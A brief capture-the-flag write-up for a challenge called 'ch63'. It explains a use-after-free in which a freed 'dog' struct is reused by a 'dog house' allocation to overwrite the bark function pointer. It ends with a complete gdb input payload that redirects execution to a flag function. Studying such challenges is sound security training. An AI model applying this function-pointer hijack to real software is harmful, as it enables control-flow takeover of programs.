# Writeup ch63

If we buy a dog then kills it. The memory pointed by the dog struct pointer gets freed but its value is not erased.
Therefore we can create a new dog house which will be allocated on that very memory place.
If we input into the name and address buffers the address of ```bringBackTheFlag``` we can overwrite the dog->bark function pointer to point to bringBackTheFlag!

```
(gdb) run < <(printf "1\nFUCK\n4\n5\n\xcb\x87\x04\x08\xcb\x87\x04\x08\xcb\x87\x04\x08\xcb\x87\x04\x08\n\xcb\x87\x04\x08\xcb\x87\x04\x08\n2\n")
```